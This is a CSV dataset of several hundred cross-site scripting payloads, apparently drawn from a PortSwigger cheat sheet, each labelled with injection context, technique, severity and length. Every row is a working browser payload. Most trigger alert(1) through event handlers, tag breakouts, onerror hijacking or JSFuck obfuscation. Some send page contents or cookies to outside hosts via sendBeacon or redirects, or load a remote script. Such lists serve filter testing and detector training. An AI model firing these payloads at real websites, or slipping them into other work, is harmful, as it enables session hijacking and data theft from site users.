payload,context,technique,severity,length,source
"<audio autoplay onloadedmetadata=alert(1)> <source src=""validaudio.wav"" type=""audio/wav""></audio>",event_handler,event_handler,medium,97,portswigger
"<video onloadstart=""alert(1)""><source></xss>",event_handler,event_handler,medium,44,portswigger
<body onmessage=print()>,event_handler,event_handler,medium,24,portswigger
<body onpagereveal=alert(1)>,event_handler,event_handler,medium,28,portswigger
<body onpageshow=alert(1)>,event_handler,event_handler,medium,26,portswigger
"<audio autoplay onplay=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",event_handler,event_handler,medium,86,portswigger
"<audio autoplay onplaying=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",event_handler,event_handler,medium,89,portswigger
<body onpopstate=print()>,event_handler,event_handler,medium,25,portswigger
<audio controls onprogress=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>,event_handler,event_handler,medium,87,portswigger
<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />,event_handler,event_handler,medium,71,portswigger
"<body onresize=""print()"">",event_handler,event_handler,medium,25,portswigger
<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>,event_handler,event_handler,medium,71,portswigger
"<xss onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></xss>",event_handler,event_handler,medium,270,portswigger
<address onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></address>,event_handler,event_handler,medium,136,portswigger
"<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class=""scroll-container"" onscrollsnapchanging=""alert(1)""> <xss class=""scroll-item"">Item 1</xss><xss class=""scroll-item"">Item 2</xss></xss>",attribute,event_handler,medium,447,portswigger
<xss onsecuritypolicyviolation=alert(1)>XSS</xss>,event_handler,event_handler,medium,49,portswigger
x<template shadowrootmode=open><slot onslotchange=alert(1)>,event_handler,event_handler,medium,59,portswigger
<audio controls onsuspend=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>,event_handler,event_handler,medium,86,portswigger
"<audio controls autoplay ontimeupdate=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",event_handler,event_handler,medium,101,portswigger
<details ontoggle=alert(1) open>test</details>,event_handler,event_handler,high,46,portswigger
"<style>:target {color: red;}</style><xss id=x style=""transition:color 10s"" ontransitioncancel=print()></xss>",attribute,event_handler,medium,108,portswigger
"<xss id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></xss>",attribute,event_handler,medium,82,portswigger
"<style>:target {transform: rotate(180deg);}</style><xss id=x style=""transition:transform 2s"" ontransitionrun=print()></xss>",attribute,event_handler,medium,123,portswigger
"<style>:target {color:red;}</style><xss id=x style=""transition:color 1s"" ontransitionstart=alert(1)></xss>",attribute,event_handler,medium,106,portswigger
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,script_injection,obfuscation,high,67,portswigger
"<body onunload=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>",dom_sink,obfuscation,medium,91,portswigger
<geolocation onvalidationstatuschange=alert(1)>,event_handler,event_handler,medium,47,portswigger
<audio controls loop muted autoplay onwaiting=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>,event_handler,event_handler,medium,106,portswigger
"<style>@keyframes x{}</style><xss style=""animation-name:x"" onwebkitanimationend=""alert(1)""></xss>",attribute,event_handler,medium,97,portswigger
"<style>@keyframes slidein {}</style><xss style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></xss>",attribute,event_handler,medium,166,portswigger
"<style>@keyframes x{}</style><xss style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></xss>",attribute,event_handler,medium,99,portswigger
<audio onwebkitplaybacktargetavailabilitychanged=alert(1)>,event_handler,event_handler,medium,58,portswigger
"<style>:target {color:red;}</style><xss id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></xss>",attribute,event_handler,medium,110,portswigger
<body onafterprint=alert(1)>,event_handler,event_handler,medium,28,portswigger
<input onauxclick=alert(1)>,event_handler,event_handler,medium,27,portswigger
"<a onbeforecopy=""alert(1)"" contenteditable>test</a>",event_handler,event_handler,medium,51,portswigger
"<a onbeforecut=""alert(1)"" contenteditable>test</a>",event_handler,event_handler,medium,50,portswigger
<xss contenteditable onbeforeinput=alert(1)>test,event_handler,event_handler,medium,48,portswigger
<xss onbeforepaste=alert(1)>XSS</xss>,event_handler,event_handler,medium,37,portswigger
<button popovertarget=x>Click me</button><xss onbeforetoggle=alert(1) popover id=x>XSS</xss>,event_handler,event_handler,medium,92,portswigger
<xss onblur=alert(1) id=x tabindex=1 style=display:block>test</xss><input value=clickme>,event_handler,event_handler,medium,88,portswigger
<input type=file oncancel=alert(1)>,event_handler,event_handler,medium,35,portswigger
<input onchange=alert(1) value=xss>,event_handler,event_handler,medium,35,portswigger
"<xss onclick=""alert(1)"" style=display:block>test</xss>",event_handler,event_handler,medium,54,portswigger
<dialog open onclose=alert(1)><form method=dialog><button>XSS</button></form>,event_handler,event_handler,medium,77,portswigger
<button commandfor=test command=show-popover>Click<div id=test oncommand=alert(1)>,event_handler,event_handler,medium,82,portswigger
"<xss oncontextmenu=""alert(1)"" style=display:block>test</xss>",event_handler,event_handler,medium,60,portswigger
"<xss oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",event_handler,event_handler,high,78,portswigger
"<xss oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",event_handler,event_handler,high,77,portswigger
"<xss ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</xss>",event_handler,event_handler,high,78,portswigger
"<xss draggable=""true"" ondrag=""alert(1)"" style=display:block>test</xss>",attribute,event_handler,medium,70,portswigger
"<xss draggable=""true"" ondragend=""alert(1)"" style=display:block>test</xss>",attribute,event_handler,medium,73,portswigger
"<xss draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</xss>",attribute,event_handler,medium,75,portswigger
"<xss draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</xss>",attribute,event_handler,medium,74,portswigger
"<xss draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</xss>",attribute,event_handler,medium,75,portswigger
"<div draggable=""true"" contenteditable>drag me</div><xss ondragover=alert(1) contenteditable style=display:block>drop here</xss>",attribute,event_handler,medium,127,portswigger
"<xss draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</xss>",attribute,event_handler,medium,75,portswigger
"<div draggable=""true"" contenteditable>drag me</div><xss ondrop=alert(1) contenteditable style=display:block>drop here</xss>",attribute,event_handler,medium,123,portswigger
<xss onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</xss><input value=clickme>,event_handler,event_handler,high,97,portswigger
"<form onformdata=""alert(1)""><button>Click</button></form>",event_handler,event_handler,medium,57,portswigger
<video onfullscreenchange=alert(1) src=validvideo.mp4 controls>,event_handler,event_handler,medium,63,portswigger
<div ongesturechange=alert(1)>XSS</div>,event_handler,event_handler,medium,39,portswigger
<div ongestureend=alert(1)>XSS</div>,event_handler,event_handler,medium,36,portswigger
<div ongesturestart=alert(1)>XSS</div>,event_handler,event_handler,medium,38,portswigger
<input type=range ongotpointercapture=alert(1)>,event_handler,event_handler,medium,47,portswigger
<input oninput=alert(1) value=xss>,event_handler,event_handler,medium,34,portswigger
<form><input oninvalid=alert(1) required><input type=submit>,event_handler,event_handler,medium,60,portswigger
"<xss onkeydown=""alert(1)"" contenteditable style=display:block>test</xss>",event_handler,event_handler,medium,72,portswigger
"<xss onkeypress=""alert(1)"" contenteditable style=display:block>test</xss>",event_handler,event_handler,medium,73,portswigger
"<xss onkeyup=""alert(1)"" contenteditable style=display:block>test</xss>",event_handler,event_handler,medium,70,portswigger
<geolocation autolocate onlocation=alert(1)>,event_handler,event_handler,medium,44,portswigger
<input type=range onlostpointercapture=alert(1)>,event_handler,event_handler,medium,48,portswigger
"<xss onmousedown=""alert(1)"" style=display:block>test</xss>",event_handler,event_handler,medium,58,portswigger
"<xss onmouseenter=""alert(1)"" style=display:block>test</xss>",event_handler,event_handler,medium,59,portswigger
"<xss onmouseleave=""alert(1)"" style=display:block>test</xss>",event_handler,event_handler,medium,59,portswigger
"<xss onmousemove=""alert(1)"" style=display:block>test</xss>",event_handler,event_handler,medium,58,portswigger
"<xss onmouseout=""alert(1)"" style=display:block>test</xss>",event_handler,event_handler,medium,57,portswigger
"<xss onmouseover=""alert(1)"" style=display:block>test</xss>",event_handler,event_handler,medium,58,portswigger
"<xss onmouseup=""alert(1)"" style=display:block>test</xss>",event_handler,event_handler,medium,56,portswigger
<xss onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,event_handler,medium,65,portswigger
<video onmozfullscreenchange=alert(1) src=validvideo.mp4 controls>,event_handler,event_handler,medium,66,portswigger
"<body onpagehide=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>",dom_sink,obfuscation,medium,93,portswigger
"<body onpageswap=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>",dom_sink,obfuscation,medium,93,portswigger
"<a onpaste=""alert(1)"" contenteditable>test</a>",event_handler,event_handler,medium,46,portswigger
"<audio autoplay controls onpause=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",event_handler,event_handler,medium,96,portswigger
<xss onpointercancel=alert(1)>XSS</xss>,event_handler,event_handler,medium,39,portswigger
<xss onpointerdown=alert(1) style=display:block>XSS</xss>,event_handler,event_handler,medium,57,portswigger
<xss onpointerenter=alert(1) style=display:block>XSS</xss>,event_handler,event_handler,high,58,portswigger
<xss onpointerleave=alert(1) style=display:block>XSS</xss>,event_handler,event_handler,medium,58,portswigger
<xss onpointermove=alert(1) style=display:block>XSS</xss>,event_handler,event_handler,medium,57,portswigger
<xss onpointerout=alert(1) style=display:block>XSS</xss>,event_handler,event_handler,medium,56,portswigger
<xss onpointerover=alert(1) style=display:block>XSS</xss>,event_handler,event_handler,medium,57,portswigger
<xss onpointerrawupdate=alert(1) style=display:block>XSS</xss>,event_handler,event_handler,medium,62,portswigger
<xss onpointerup=alert(1) style=display:block>XSS</xss>,event_handler,event_handler,medium,55,portswigger
<geolocation onpromptaction=alert(1)>,event_handler,event_handler,medium,37,portswigger
<geolocation onpromptdismiss=alert(1)>,event_handler,event_handler,medium,38,portswigger
"<audio controls autoplay onratechange=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",event_handler,event_handler,medium,101,portswigger
<form onreset=alert(1)><input type=reset>,event_handler,event_handler,medium,41,portswigger
"<form><input type=search onsearch=alert(1) value=""Hit return"" autofocus>",event_handler,event_handler,high,72,portswigger
"<audio autoplay controls onseeked=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",event_handler,event_handler,medium,97,portswigger
"<audio autoplay controls onseeking=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",event_handler,event_handler,medium,98,portswigger
"<input onselect=alert(1) value=""XSS"" autofocus>",event_handler,event_handler,high,47,portswigger
<body onselectionchange=alert(1)>select some text,event_handler,event_handler,medium,49,portswigger
<body onselectstart=alert(1)>select some text,event_handler,event_handler,medium,45,portswigger
<form onsubmit=alert(1)><input type=submit>,event_handler,event_handler,medium,43,portswigger
<button popovertarget=x>Click me</button><xss ontoggle=alert(1) popover id=x>XSS</xss>,event_handler,event_handler,high,86,portswigger
<xss ontouchcancel=alert(1)>XSS</xss>,event_handler,event_handler,medium,37,portswigger
<body ontouchend=alert(1)>,event_handler,event_handler,medium,26,portswigger
<body ontouchmove=alert(1)>,event_handler,event_handler,medium,27,portswigger
<body ontouchstart=alert(1)>,event_handler,event_handler,medium,28,portswigger
"<audio autoplay controls onvolumechange=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",event_handler,event_handler,medium,103,portswigger
<audio controls onwaiting=alert(1)><source src=x type=x></audio>,event_handler,event_handler,medium,64,portswigger
<video controls src=validvideo.mp4 onwebkitfullscreenchange=alert(1)>,event_handler,event_handler,medium,69,portswigger
<xss onwebkitmouseforcechanged=alert(1)>XSS</xss>,event_handler,event_handler,medium,49,portswigger
<xss onwebkitmouseforcedown=alert(1)>XSS</xss>,event_handler,event_handler,medium,46,portswigger
<xss onwebkitmouseforceup=alert(1)>XSS</xss>,event_handler,event_handler,medium,44,portswigger
<xss onwebkitmouseforcewillbegin=alert(1)>XSS</xss>,event_handler,event_handler,medium,51,portswigger
<video controls src=validvideo.mp4 onwebkitpresentationmodechanged=alert(1)>,event_handler,event_handler,medium,76,portswigger
<xss onwebkitwillrevealbottom=alert(1)>XSS</xss>,event_handler,event_handler,medium,48,portswigger
<body onwheel=alert(1)>,event_handler,event_handler,medium,23,portswigger
"<noembed><img title=""</noembed><img src onerror=alert(1)>""></noembed>",attribute,event_handler,high,69,portswigger
"<noscript><img title=""</noscript><img src onerror=alert(1)>""></noscript>",attribute,event_handler,high,72,portswigger
"<style><img title=""</style><img src onerror=alert(1)>""></style>",attribute,event_handler,high,63,portswigger
"<script><img title=""</script><img src onerror=alert(1)>""></script>",script_injection,event_handler,high,66,portswigger
"<iframe><img title=""</iframe><img src onerror=alert(1)>""></iframe>",attribute,event_handler,high,66,portswigger
"<xmp><img title=""</xmp><img src onerror=alert(1)>""></xmp>",attribute,event_handler,high,57,portswigger
"<textarea><img title=""</textarea><img src onerror=alert(1)>""></textarea>",attribute,event_handler,high,72,portswigger
"<noframes><img title=""</noframes><img src onerror=alert(1)>""></noframes>",attribute,event_handler,high,72,portswigger
"<title><img title=""</title><img src onerror=alert(1)>""></title>",attribute,event_handler,high,63,portswigger
"<script>eval(myUndefVar);var inject=""INJECTION_STARTS_HERE"";var myUndefVar;alert(1);//"";</script>",dom_sink,obfuscation,high,97,portswigger
"<script>myUndefFunction(13,37);var inject=""INJECTION_STARTS_HERE"";function myUndefFunction(){};alert(1);//"";</script>",script_injection,obfuscation,high,117,portswigger
"<script>var myUndefObject = new myUndefClass();var inject=""INJECTION_STARTS_HERE"";function myUndefClass(){};alert(1);//"";</script>",script_injection,obfuscation,high,130,portswigger
"<script>$(document).ready(function(){var inject=""INJECTION_STARTS_HERE"";});function $(){return{ready:()=>0}};alert(1);(function(){"""";});</script>",script_injection,script_tag,high,145,portswigger
"<script>undef01.undef02(""INJECTION""+alert(1));function undef01(){}//"");</script>",script_injection,obfuscation,high,80,portswigger
"<script>undef01['undef02','INJECTION'+alert(1)];function undef01(){};//'];</script>",script_injection,obfuscation,high,83,portswigger
"<script type=""module"">undef01.undef02.undef03.undef04.undef05();var inject = ""INJECTION"";import ""data:text/jscript,alert(1)""//"";</script>",script_injection,obfuscation,high,137,portswigger
"<script>var x=atob(""dXNlbGVzcyBjYWxsIG9mIG5hdGl2ZSBmdW5jdGlvbiAh"");undef01.undef02();var inject = ""INJECTION"";function atob(){alert(1);}//"";</script>",script_injection,obfuscation,high,149,portswigger
"<input type=""file"" id=""fileInput"" /><script>const fileInput = document.getElementById('fileInput');const dataTransfer = new DataTransfer();const file = new File(['Hello world!'], 'hello.txt', {type: 'text/plain'});dataTransfer.items.add(file);fileInput.files = dataTransfer.files</script>",script_injection,script_tag,high,288,portswigger
<script>onerror=alert;throw 1</script>,script_injection,restricted_chars,high,38,portswigger
<script>{onerror=alert}throw 1</script>,script_injection,restricted_chars,high,39,portswigger
"<script>throw onerror=alert,1</script>",script_injection,restricted_chars,high,38,portswigger
"<script>throw onerror=eval,'=alert\x281\x29'</script>",script_injection,restricted_chars,high,53,portswigger
"<script>throw onerror=eval,'alert\x281\x29'</script>",script_injection,restricted_chars,high,52,portswigger
"<script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}</script>",script_injection,restricted_chars,high,101,portswigger
"<script>throw onerror=eval,e=new Error,e.message='alert\x281\x29',e</script>",script_injection,restricted_chars,high,76,portswigger
"<script>throw onerror=Uncaught=eval,e=new Error,e.message='/*'+location.hash,!!window.InstallTrigger?e:e.message</script>",script_injection,restricted_chars,high,121,portswigger
"<script>throw{},onerror=Uncaught=eval,h=location.hash,e={lineNumber:1,columnNumber:1,fileName:0,message:h[2]+h[1]+h},!!window.InstallTrigger?e:e.message</script>",script_injection,restricted_chars,high,161,portswigger
"<script>throw/x/,onerror=Uncaught=eval,h=location.hash,e=Error,e.lineNumber=e.columnNumber=e.fileName=e.message=h[2]+h[1]+h,!!window.InstallTrigger?e:e.message</script>",script_injection,restricted_chars,high,168,portswigger
<script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>,script_injection,restricted_chars,high,70,portswigger
<script>'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}</script>,script_injection,restricted_chars,high,73,portswigger
<script>location='javascript:alert\x281\x29'</script>,script_injection,restricted_chars,high,53,portswigger
<script>location=name</script>,script_injection,restricted_chars,high,30,portswigger
<script>alert`1`</script>,script_injection,restricted_chars,high,25,portswigger
<script>new Function`X${document.location.hash.substr`1`}`</script>,template_injection,restricted_chars,high,67,portswigger
<script>Function`X${document.location.hash.substr`1`}```</script>,template_injection,restricted_chars,high,65,portswigger
<video><source onerror=location=/\02.rs/+document.cookie>,event_handler,restricted_chars,high,57,portswigger
<svg onload=alert(1),event_handler,restricted_chars,high,20,portswigger
<svg onload=alert(1)<!--,event_handler,restricted_chars,high,24,portswigger
"<script>throw[onerror]=[alert],1</script>",script_injection,restricted_chars,high,41,portswigger
<script>var{a:onerror}={a:alert};throw 1</script>,script_injection,restricted_chars,high,49,portswigger
<script>var{haha:onerror=alert}=0;throw 1</script>,script_injection,restricted_chars,high,50,portswigger
<script>window.name='javascript:alert(1)';</script><svg onload=location=name>,script_injection,restricted_chars,high,77,portswigger
"<script>window.name='javascript:alert(1)';function blah(){}
blah(""""+{a:location=name}+"""")</script>",script_injection,restricted_chars,high,98,portswigger
"<script>window.name='javascript:alert(1)';function blah(){}
blah(""""+new class b{toString=e=>location=name}+"""")</script>",script_injection,restricted_chars,high,119,portswigger
<SCRIPT SRC=HTTPS://PORTSWIGGER-LABS.NET/A.JS></SCRIPT>,script_injection,restricted_chars,high,55,portswigger
<SCRIPT>[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]])</SCRIPT>,script_injection,restricted_chars,high,2362,portswigger
"<script>throw onerror=eval,name</script>",script_injection,restricted_chars,high,40,portswigger
"<script>throw onerror=eval,'/*'+location</script>",script_injection,restricted_chars,high,49,portswigger
"<svg onload=""throw top.onerror=eval,'/*'+URL"">",attribute,restricted_chars,high,46,portswigger
"<body onload=""throw onerror=eval,'/*'+location"">",attribute,restricted_chars,high,48,portswigger
<script>ondevicemotion=setTimeout;Event.prototype.toString=URIError.prototype.toString;Event.prototype.message='alert\x281\x29'</script>,script_injection,restricted_chars,high,136,portswigger
<script>ondeviceorientation=setTimeout;Event.prototype.toString=Error.prototype.toString;Event.prototype.name='alert\x281\x29'</script>,script_injection,restricted_chars,high,135,portswigger
<script>ondeviceorientationabsolute=setTimeout;Event.prototype.toString=WebTransportError.prototype.toString;Event.prototype.name='alert\x281\x29'</script>,script_injection,restricted_chars,high,155,portswigger
<script>onpagereveal=setTimeout;Event.prototype.toString=AggregateError.prototype.toString;Event.prototype.name='alert\x281\x29'</script>,script_injection,restricted_chars,high,137,portswigger
<script>onpageswap=setTimeout;location='x';Event.prototype.toString=EvalError.prototype.toString;Event.prototype.name='alert\x281\x29'</script>,script_injection,restricted_chars,high,143,portswigger
"<iframe id=target></iframe><script>target.src='xss.php?x=<img/src/onerror=onmessage=setTimeout;Event.prototype.toString=RangeError.prototype.toString;Event.prototype.name=""alert\x281\x29"">';target.onload=setTimeout(function(){frames[0].postMessage("""", ""*"")},100)</script>",dom_sink,restricted_chars,high,271,portswigger
<script>onhashchange=setTimeout;location.hash=location;Event.prototype.flags='.call\x28alert\x281\x29\x29';Event.prototype.toString=/x/.toString</script>,script_injection,restricted_chars,high,153,portswigger
<script>onscroll=setTimeout;document.body.style.height='9999px';document.documentElement.scrollTop=1;Event.prototype.toString=ReferenceError.prototype.toString;Event.prototype.name='alert\x281\x29'</script>,script_injection,restricted_chars,high,206,portswigger
<script>onscrollend=setTimeout;document.body.style.height='9999px';document.documentElement.scrollTop=1;Event.prototype.toString=SyntaxError.prototype.toString;Event.prototype.name='alert\x281\x29'</script>,script_injection,restricted_chars,high,206,portswigger
"<input value=x autofocus onfocus=""window.onselect=setTimeout;this.selectionStart=1;Event.prototype.toString=TypeError.prototype.toString;Event.prototype.message='alert\x281\x29'"">",attribute,restricted_chars,high,179,portswigger
